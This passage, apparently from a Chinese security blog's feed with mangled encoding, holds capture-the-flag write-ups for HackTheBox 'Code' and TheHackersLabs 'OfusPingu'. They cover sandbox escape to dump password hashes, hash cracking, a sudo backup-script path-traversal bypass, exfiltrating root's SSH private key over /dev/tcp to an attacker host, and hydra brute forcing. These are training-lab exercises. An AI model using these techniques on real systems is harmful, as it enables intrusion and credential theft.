æ–°ç«¯å£æ˜¯ä¸€ä¸ªä»£ç ç¼–è¾‘å™¨`Python Code Editor`

```bash
âš¡ root@kali î‚° ~/Desktop/test/Code î‚° nmap -sT -A -T4 -O -p 22,5000 10.10.11.62     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:30 EDT
Nmap scan report for 10.10.11.62
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   204.69 ms 10.10.16.1
2   156.61 ms 10.10.11.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.11 seconds
```

## WEB æ¸—é€

å¯ä»¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œé¦–å…ˆå°è¯•ä¸€ä¸‹`os` åº“

![image.png](/post-images/HackTheBoxSeason7-Code/image56.png)

æç¤º`Use of restricted keywords is not allowed.` ç»è¿‡æµ‹è¯•æ˜¯å°†`import` ã€`os` ç­‰å…³é”®å­—ç»™è¿‡æ»¤äº†

å³è¾¹å¯ä»¥åˆ›å»ºè´¦æˆ·ï¼Œè¿™é‡Œåˆ›å»ºäº†ç”¨æˆ·`sunset`

![image.png](/post-images/HackTheBoxSeason7-Code/image57.png)

å¯ä»¥çœ‹åˆ°å­˜åœ¨`MyCodes` ï¼Œæˆ‘ä»¬å°†ä»£ç ä¿å­˜ä¸º`test`è¯•è¯•

![image.png](/post-images/HackTheBoxSeason7-Code/image58.png)

å°è¯•ä¸€ä¸‹è¯­æ³•æ³¨å…¥

![image.png](/post-images/HackTheBoxSeason7-Code/image59.png)

å¯ä»¥æˆåŠŸå›æ˜¾ï¼Œå†å°è¯•ä¸€ä¸‹ä½¿ç”¨æ¨¡æ¿è¯­æ³•

![image.png](/post-images/HackTheBoxSeason7-Code/image60.png)

ä¹Ÿæ˜¯æˆåŠŸå›æ˜¾äº†ï¼Œé‚£ä¹ˆè¯¥åº”ç”¨æ˜¯ä½¿ç”¨`Flask`æ­å»ºçš„`Web`åº”ç”¨

ä½¿ç”¨`SSTImap`å°è¯•æ¨¡æ¿æ³¨å…¥

```bash
python sstimap.py -u http://10.10.11.62:5000/run_code -H 'application/x-www-form-urlencoded; charset=UTF-8' -m 'POST' -d 'code=print(render_template_string("{{*}}"))'
```

ç»“æœå°±æ˜¯æ²¡åŠæ³•åˆ©ç”¨ï¼Œä½†æ˜¯çŸ¥é“äº†å­˜åœ¨`jinja2`

![image.png](/post-images/HackTheBoxSeason7-Code/image61.png)

å› ä¸ºå­˜åœ¨ç™»é™†æ“ä½œï¼Œæ‰€ä»¥å¯èƒ½å¯ä»¥è¿›è¡Œæ“ä½œæ•°æ®åº“ï¼Œå°è¯•ä¸€ä¸‹æ•°æ®åº“è¯­æ³•

![image.png](/post-images/HackTheBoxSeason7-Code/image62.png)

æœ‰å›æ˜¾ï¼Œé€šè¿‡`GPT`è¿›è¡Œæ„é€ 

```bash
code=print([user.username for user in User.query.all()])
// output
{"output":"['development', 'martin', 'test']\n"}
```

```bash

code=print([user.password for user in User.query.all()])
// output
{"output":"['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be', '098f6bcd4621d373cade4e832627b4f6']\n"}
```

å¾—åˆ°ä¸¤ç»„ç”¨æˆ·åå¯†ç `development:759b74ce43947f5f4c91aeddc3e5bad3` å’Œ`martin:3de6f30c4a09c27fc71932bfc68474be`

å°†å¯†ç ä¿å­˜åˆ°`pass.txt`ä½¿ç”¨`John`ç ´è§£

```bash
âš¡ root@kali î‚° ~/Desktop/test/Code î‚° john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 pass.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
development      (?)     
nafeelswordsmaster (?)     
2g 0:00:00:00 DONE (2025-03-25 00:26) 3.333g/s 8711Kp/s 8711Kc/s 9050KC/s nafi79..naerulz
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

```bash
development:development
martin:nafeelswordsmaster
```

å¾—åˆ°ä¸¤ä¸ªè´¦æˆ·ï¼Œç›´æ¥å°è¯•`SSH` 

æœ€åä½¿ç”¨`martin`æˆåŠŸç™»å½•

```bash
âš¡ root@kali î‚° ~/Desktop/test/Code î‚° ssh martin@10.10.11.62
martin@10.10.11.62's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 25 Mar 2025 04:10:56 AM UTC

  System load:           0.3
  Usage of /:            51.4% of 5.33GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             234
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c80e

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Mar 25 04:10:56 2025 from 10.10.16.7
martin@code:~$ 
```

## Get Flag

ä¿¡æ¯æ”¶é›†ä¸€æ³¢

```bash
martin@code:~$ uname -a
Linux code 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
martin@code:~$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:c8:0e brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.62/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:c80e/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:c80e/64 scope link 
       valid_lft forever preferred_lft forever
```

```bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥ä»¥`Root`æƒé™è¿è¡Œçš„è„šæœ¬

```bash
martin@code:~/backups/home/app-production/app$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

è„šæœ¬æ¥æ”¶`task.json` ï¼Œè¯»å– `directories_to_archive` å­—æ®µçš„ç›®å½•åˆ—è¡¨ï¼Œåªå…è®¸ `/var/` å’Œ `/home/` ç›®å½•ä¸‹çš„è·¯å¾„ï¼Œå…¶ä»–è·¯å¾„ä¼šè§¦å‘é”™è¯¯å¹¶é€€å‡º

å°è¯•æ„é€ `Json`æ–‡ä»¶`task.json`

```bash
{
	"directories_to_archive":[
		"/home/app-production/"
	]
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:38:38 ğŸ€ backy 1.2
2025/03/25 06:38:38 ğŸ“‹ Working with task.json ...
2025/03/25 06:38:38 ğŸ”° Task configuration: destination must be specified!
2025/03/25 06:38:38 â— Can't read provided task configuration
```

ç¼ºå°‘`desination`å‚æ•°ï¼Œåº”è¯¥æ˜¯ä¿å­˜åˆ°å“ªçš„å‚æ•°

```bash
{
	"directories_to_archive":[
		"/home/app-production/"
	],
	"destination":"/home/martin"
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:41:28 ğŸ€ backy 1.2
2025/03/25 06:41:28 ğŸ“‹ Working with task.json ...
2025/03/25 06:41:28 ğŸ’¤ Nothing to sync
2025/03/25 06:41:28 ğŸ“¤ Archiving: [/home/app-production]
2025/03/25 06:41:28 ğŸ“¥ To: /home/martin ...
2025/03/25 06:41:28 ğŸ“¦
```

æ‰§è¡Œå®Œæˆåå¤šå‡ºæ¥ä¸€ä¸ªå‹ç¼©åŒ…

```bash
martin@code:~$ ls
backups  code_home_app-production_2025_March.tar.bz2  task.json
```

å¯¹å…¶è¿›è¡Œè§£å‹ï¼Œè§£å‹å®Œæ¯•åå¯ä»¥å‘ç°æ˜¯ç”¨æˆ·`app-production` çš„å®¶ç›®å½•ï¼Œå¹¶ä¸”å­˜åœ¨`user.txt`

```bash
martin@code:~/home/app-production$ cat user.txt 
4332e6b51ad86bfd87072af615996ff1
```

å†æ„é€ è¯»å–`root`çš„å®¶ç›®å½•

```bash
{
	"directories_to_archive":[
		"/home/../root/"
	],
	"destination":"/home/martin"
}
// run
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:46:56 ğŸ€ backy 1.2
2025/03/25 06:46:56 ğŸ“‹ Working with task.json ...
2025/03/25 06:46:56 ğŸ’¤ Nothing to sync
2025/03/25 06:46:56 ğŸ“¤ Archiving: [/home/root]
2025/03/25 06:46:56 ğŸ“¥ To: /home/martin ...
2025/03/25 06:46:56 ğŸ“¦
2025/03/25 06:46:56 ğŸ’¢ Archiving failed for: /home/root
2025/03/25 06:46:56 â— Archiving completed with errors
```

æ„é€ åŒå†™ç»•è¿‡

```bash
{
	"directories_to_archive":[
		"/home/....//root/"
	],
	"destination":"/home/martin"
}
// run
rtin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/03/25 06:49:24 ğŸ€ backy 1.2
2025/03/25 06:49:24 ğŸ“‹ Working with task.json ...
2025/03/25 06:49:24 ğŸ’¤ Nothing to sync
2025/03/25 06:49:24 ğŸ“¤ Archiving: [/home/../root]
2025/03/25 06:49:24 ğŸ“¥ To: /home/martin ...
2025/03/25 06:49:24 ğŸ“¦
```

æˆåŠŸï¼Œè¯»å–root.txt

```bash
martin@code:~/root$ cat root.txt 
372cf788ca3e30b86c01d19cb8bac1d9
```

## Get Root Shell

è§£å‹é—®å°±æŒ‰åçœ‹åˆ°å­˜åœ¨`.ssh`æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”å­˜åœ¨ç§é’¥`id_rsa`

è½¬å‚¨ç§é’¥åˆ°æ”»å‡»æœº

```bash
// Kali
**nc -lvp 1234 > sshkey**
// Code
**martin@code:~/root/.ssh$ cat id_rsa > /dev/tcp/10.10.16.7/1234**
```

![image.png](/post-images/HackTheBoxSeason7-Code/image63.png)

ä¿®æ”¹æƒé™ä¸º`600` ï¼Œå¹¶ä½¿ç”¨ç§é’¥è¿›è¡Œç™»å½•

```bash
âš¡ root@kali î‚° ~/Desktop/test/Code î‚° chmod 600 sshkey                      
âš¡ root@kali î‚° ~/Desktop/test/Code î‚° ssh root@10.10.11.62 -i sshkey          
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)     
                                                                              
 * Documentation:  https://help.ubuntu.com                                    
 * Management:     https://landscape.canonical.com                            
 * Support:        https://ubuntu.com/pro                                     
                                                                              
 System information as of Tue 25 Mar 2025 07:10:19 AM UTC                     
                                                                              
  System load:           0.0                                                  
  Usage of /:            51.3% of 5.33GB                                      
  Memory usage:          13%                                                  
  Swap usage:            0%                                                   
  Processes:             236                                                  
  Users logged in:       1                                                    
  IPv4 address for eth0: 10.10.11.62                                          
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4461                        
                                                                              
                                                                              
Expanded Security Maintenance for Applications is not enabled.                
                                                                              
0 updates can be applied immediately.                                         
                                                                              
Enable ESM Apps to receive additional future security updates.                
See https://ubuntu.com/esm or run: sudo pro status                            
                                       
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings 
                                                                              
                                                                              
Last login: Tue Mar 25 07:10:19 2025 from 10.10.16.7                          
root@code:~#                           
```
]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Linuxé¶æœº</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - OfusPingu]]></title>
            <link>https://www.sunsetaction.top/2025/08/05/TheHackersLabsOfusPingu</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/05/TheHackersLabsOfusPingu</guid>
            <pubDate>Tue, 05 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[OfusPingu https://labs.thehackerslabs.com/machine/102 Recon PortScan æšä¸¾ HTTP 80 ç«¯å£ ç›®å½•æ‰«æ script.js å¾ˆæ˜æ˜¾å°±æ˜¯è¢«æ··æ·†è¿‡äº† é€šè¿‡ AI è¿›è¡Œæ¢å¤ å¾—åˆ°ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚ç§˜é’¥ï¼šQWERTYCHOCOLATITOC...]]></description>
            <content:encoded><![CDATA[
# OfusPingu

> https://labs.thehackerslabs.com/machine/102
> 

![image.png](/post-images/TheHackersLabsOfusPingu/image.png)

## Recon

### PortScan

```bash
âœ  OfusPingu nmap -sn 192.168.56.0/24                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:31 CST
Nmap scan report for 192.168.56.1
Host is up (0.00042s latency).
MAC Address: 0A:00:27:00:00:08 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00022s latency).
MAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.103
Host is up (0.00040s latency).
MAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 27.97 seconds
```

```bash
âœ  OfusPingu nmap -sT -min-rate 10000 -p- 192.168.56.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:34 CST
Nmap scan report for 192.168.56.103
Host is up (0.00056s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.01 seconds
```

```bash
âœ  OfusPingu nmap -sT -A -p 22,80,3000 192.168.56.103    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:36 CST
Nmap scan report for 192.168.56.103
Host is up (0.00056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:08:d0:7c:02:65:4d:8b:95:7b:a2:89:af:ab:fc:9c (ECDSA)
|_  256 af:ff:d1:1b:e2:5a:32:cb:23:47:71:2d:7a:2c:93:2e (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Ofuscaci\xC3\xB3n de C\xC3\xB3digo JavaScript | Seguridad en APIs
|_http-server-header: Apache/2.4.62 (Debian)
3000/tcp open  http    Node.js Express framework
|_http-title: Error
MAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.56.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
```

### æšä¸¾

`HTTP` 80 ç«¯å£

![image.png](/post-images/TheHackersLabsOfusPingu/image1.png)

ç›®å½•æ‰«æ

```bash
âœ  OfusPingu feroxbuster --url http://192.168.56.103 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip,php
  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.56.103
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [js, txt, zip, php]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       23w     1492c http://192.168.56.103/script.js
200      GET      422l     1343w    17244c http://192.168.56.103/
[####################] - 2m   1102740/1102740 0s      found:2       errors:965    
[####################] - 2m   1102725/1102725 8759/s  http://192.168.56.103/
```

`script.js` å¾ˆæ˜æ˜¾å°±æ˜¯è¢«æ··æ·†è¿‡äº†

![image.png](/post-images/TheHackersLabsOfusPingu/image2.png)

é€šè¿‡ `AI` è¿›è¡Œæ¢å¤

```bash
// =======================================================
//               ã€è¿˜åŸåçš„å¯è¯»ä»£ç ã€‘
// =======================================================

// å‡½æ•°ï¼šåˆå§‹åŒ–åº”ç”¨ç¨‹åº
function inicializarAplicacion() {
    // è¿™ä¸ª 'configParts' å˜é‡åœ¨è¿™æ®µä»£ç ä¸­å¹¶æœªå®šä¹‰ï¼Œ
    // å®ƒå¾ˆå¯èƒ½æ˜¯åœ¨æ­¤è„šæœ¬åŠ è½½ä¹‹å‰çš„æŸä¸ªåœ°æ–¹å®šä¹‰çš„å…¨å±€å˜é‡ã€‚
    // å‡è®¾ configParts = ['QWERTY', 'CHOCOLATITO', 'CHOCOLATON', 'CHINGON']
    const API_KEY_SECRETA = configParts.map(f => f.toLowerCase()).join(''); 
    // ç»“æœä¼šæ˜¯ 'qwertychocolatitocholatonchingon'

    // åº”ç”¨çš„é…ç½®å¯¹è±¡
    const appConfig = {
        version: '1.0.3',
        entorno: 'produccion', // ç¯å¢ƒï¼šç”Ÿäº§
        apiEndpoint: 'https://adivinaadivinanza/v3', // API åœ°å€
        credenciales: {
            usuario: 'jeje',
            // é€šè¿‡ä¸€ç³»åˆ—å­—ç¬¦ä¸²æ“ä½œç”Ÿæˆè®¿é—®å‡­è¯
            acceso: API_KEY_SECRETA.split('').reverse().join('') + '123'.split('').reverse().join('')
            // 'qwertychocolatitocholatonchingon' -> åè½¬ -> 'nognihcnotalocotihtalocohcytrewq'
            // '123' -> åè½¬ -> '321'
            // æœ€ç»ˆçš„ acceso æ˜¯ 'nognihcnotalocotihtalocohcytrewq321'
        },
        features: {
            darkMode: true,
            analytics: false
        }
    };

    // å‡½æ•°ï¼šè¿æ¥API
    const conectarAPI = () => {
        // å¯¹ 'acceso' å‡­è¯å†æ¬¡è¿›è¡Œå¤„ç†ï¼Œç”Ÿæˆæœ€ç»ˆçš„å¯†é’¥
        const claveFinal = appConfig.credenciales.acceso.slice(0, -3).split('').reverse().join('');
        // 1. å»æ‰æœ€å3ä¸ªå­—ç¬¦ ('321') -> 'nognihcnotalocotihtalocohcytrewq'
        // 2. å†æ¬¡åè½¬ -> 'qwertychocolatitocholatonchingon' (æ¢å¤åŸæ ·)

        console.log('Conectando la API con clave:', claveFinal); // "è¿æ¥ APIï¼Œä½¿ç”¨å¯†é’¥: qwertychocolatitocholatonchingon"
        
        // è¿”å›ä¸€ä¸ªæ¨¡æ‹Ÿçš„APIè¿æ¥æˆåŠŸå¯¹è±¡
        return {
            status: 200,
            message: 'ConexiÃ³n exitosa', // "è¿æ¥æˆåŠŸ"
            // å°† 'å¯†é’¥:admin' è¿›è¡Œ Base64 ç¼–ç ä½œä¸º token
            token: btoa(claveFinal + ':' + 'admin') 
        };
    };

    // **å…³é”®é€»è¾‘**ï¼šåªæœ‰å½“ç½‘é¡µçš„åŸŸåæ˜¯ 'secretazosecreton' æ—¶ï¼Œæ‰æ‰§è¡Œè¿æ¥APIçš„æ“ä½œ
    if (window.location.hostname === 'secretazosecreton') {
        // 3ç§’åæ‰§è¡Œ
        setTimeout(() => {
            const m = conectarAPI();
            console.log('Resultado conexiÃ³n:', m); // "è¿æ¥ç»“æœ: ..."
        }, 3000);
    }
}

// å½“æ•´ä¸ªé¡µé¢çš„HTMLåŠ è½½å’Œè§£æå®Œæˆåï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç 
document.addEventListener('DOMContentLoaded', () => {
    // 1. åˆå§‹åŒ–åº”ç”¨
    inicializarAplicacion();
    
    // 2. ç»™é¡µé¢ä¸Šæ‰€æœ‰çš„ <button> å…ƒç´ æ·»åŠ ç‚¹å‡»äº‹ä»¶ç›‘å¬
    const buttons = document.querySelectorAll('button');
    buttons.forEach(btn => {
        btn.addEventListener('click', () => {
            console.log('BotÃ³n clickeado'); // "æŒ‰é’®è¢«ç‚¹å‡»äº†"
        });
    });
});

// å‡½æ•°ï¼šéªŒè¯å¯†é’¥
function validarClave(a) {
    const claveReal = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';
    return a === claveReal;
}

// è¿™æ˜¯ä¸€ä¸ªæ¨¡å—å¯¼å‡ºè¯­å¥ï¼Œå¸¸è§äº Node.js ç¯å¢ƒã€‚
// æ„æ€æ˜¯å¦‚æœè¿™ä¸ªJSæ–‡ä»¶åœ¨æ”¯æŒæ¨¡å—åŒ–çš„ç¯å¢ƒï¼ˆå¦‚Node.jsï¼‰ä¸­è¢«å¼•ç”¨ï¼Œ
// å®ƒä¼šå¯¼å‡ºä¸€ä¸ªåŒ…å« validarClave å‡½æ•°çš„å¯¹è±¡ã€‚
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        validarClave
    };
}
```

å¾—åˆ°ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚ç§˜é’¥ï¼š`QWERTYCHOCOLATITOCHOCOLATONCHINGON`

æ¥ä¸‹æ¥åˆ° `3000`ç«¯å£

![image.png](/post-images/TheHackersLabsOfusPingu/image3.png)

å¯¹ `3000` ç«¯å£è¿›è¡Œ `fuzz` 

```bash
âœ  OfusPingu wfuzz -u 'http://192.168.56.103:3000/FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.103:3000/FUZZ
Total requests: 74332

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                        
=====================================================================

000000823:   400        0 L      2 W        33 Ch       "api"                                                                                                                          
000016154:   301        10 L     15 W       156 Ch      "public"                                                                                                                       
000016155:   301        10 L     15 W       156 Ch      "Public"                                                                                                                       
000022384:   400        0 L      2 W        21 Ch       "view"                                                                                                                         

Total time: 88.55361
Processed Requests: 74332
Filtered Requests: 74328
Requests/sec.: 839.4010
```

`api` ç›´æ¥è®¿é—®æç¤º

```bash
{"error":"ParÃ¡metro incorrecto."}
```

`view` ç›´æ¥è®¿é—®æç¤º

```bash
ParÃ¡metro incorrecto.
```

åœ¨å¯¹å…¶è¿›è¡Œæšä¸¾ï¼Œä½¿ç”¨ä¸Šè¾¹çš„ç§˜é’¥ä½œä¸ºå‚æ•°

```bash
âœ  OfusPingu wfuzz -u 'http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc=404,400
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON
Total requests: 74332

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                        
=====================================================================

000020620:   200        0 L      1 W        30 Ch       "token"  
```

æšä¸¾å‡ºæ¥ `token`

```bash
âœ  OfusPingu curl http://192.168.56.103:3000/api/\?token\=QWERTYCHOCOLATITOCHOCOLATONCHINGON                                                                     
{"key":"MI-KEY-SECRETA-12345"}# 
```

å¾—åˆ°ä¸€ä¸ª `key`

æˆ‘ä»¬å†æµ‹è¯• `view`

```bash
âœ  OfusPingu curl http://192.168.56.103:3000/view/\?token\=QWERTYCHOCOLATITOCHOCOLATONCHINGON
ParÃ¡metro incorrecto.#

âœ  OfusPingu curl http://192.168.56.103:3000/view/\?token\=MI-KEY-SECRETA-12345
ParÃ¡metro incorrecto.#

âœ  OfusPingu curl http://192.168.56.103:3000/view/\?key\='MI-KEY-SECRETA-12345'                  
<!DOCTYPE html>        
<html lang="es">                                                                                
<head>                                                                                          
  <meta charset="UTF-8">                        
  <title>Zona Secreta</title
  ...
```

å‘Šè¯‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¯†ç å’Œ `debian` è¿›è¡Œ `ssh` ç™»å½•

![image.png](/post-images/TheHackersLabsOfusPingu/image4.png)

ä½¿ç”¨ `hydra` è¿›è¡Œçˆ†ç ´

```bash
âœ  OfusPingu hydra -l debian -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.103 ssh                                                                                                       
